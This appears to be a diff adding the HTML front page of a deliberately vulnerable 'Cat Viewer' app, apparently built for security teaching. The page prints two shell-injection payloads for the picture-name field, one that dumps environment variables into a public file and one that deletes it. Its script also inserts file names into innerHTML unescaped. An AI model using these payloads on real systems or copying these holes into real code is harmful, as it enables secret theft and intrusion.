@@ -1,0 +1,73 @@
+<html>
+    <head>
+        <style>
+            :root{
+                background: #999999
+            }
+        </style>
+    </head>
+    <body style="max-width:900; margin-left: auto; margin-right: auto; margin-top: 3em; background: #dddddd; padding: 2em;">
+        <article>
+            <header>
+                <h2>Cat Viewer!</h2>
+                <h3>The worst cat viewer!</h3>
+            </header>
+            <p>Where cats and poor coding choices come together!</p>
+        </article>
+
+        <article>
+            <header>
+                <h3>Upload your own cat!</h3>
+            </header>
+            <form action="./upload_cat" method="post" enctype="multipart/form-data" >
+
+                <label for="picture_name">Picture Name</label>
+                <input type="text" id="picture_name" name="picture_name" ><br>
+
+
+                <label for="file">Select file:</label>
+                <input type="file" name="file" id="file"><br>
+
+                <input type="submit" value="Upload">
+            </form>
+
+            <section>
+                <header>
+                    <h3>Cats Photos</h3>
+                    <section id="cat_photos">
+
+                    </section>
+                </header>
+
+            </section>
+
+            <p><b>Don't paste the following into the picture name! <span style="color:red;">whatever.png" & echo "$(printenv)" > ./src/app/static/cats/yr_owned.txt & echo "</span> </b></p>
+            <p><b>And not this to cover your tracks! <span style="color:red;">whatever.png" & rm ./src/app/static/cats/yr_owned.txt & echo "</span> </b></p>
+        </article>
+    </body>
+
+    <script>
+        function get_cats() {
+            fetch("/list_cats").then(x => x.json()).then(r => {
+                photos = r.filter(x => x.endsWith(".png"))
+                files = r.map(x => x.slice(0, -4))
+                files.sort()
+                i_html = ""
+                files.forEach(x => {
+                    link = "./cats/" + x + ".png"
+                    i_html += '<div style="display:block; width:80%; margin:4em; border: 1px solid black;"> <a href="' + link + '"> <img style="width:90%; margin-left:auto; margin-right:auto; display:block; margin-top:2em" src="' + link + '"/></a><p style="text-align:center;">' + x + '</p><bg></div>\n'
+
+                })
+                console.log(i_html)
+                document.getElementById("cat_photos").innerHTML = i_html
+            })
+        }
+
+        get_cats();
+
+        setInterval(function() {
+            get_cats()
+        }, 4000);
+
+    </script>
+</html>
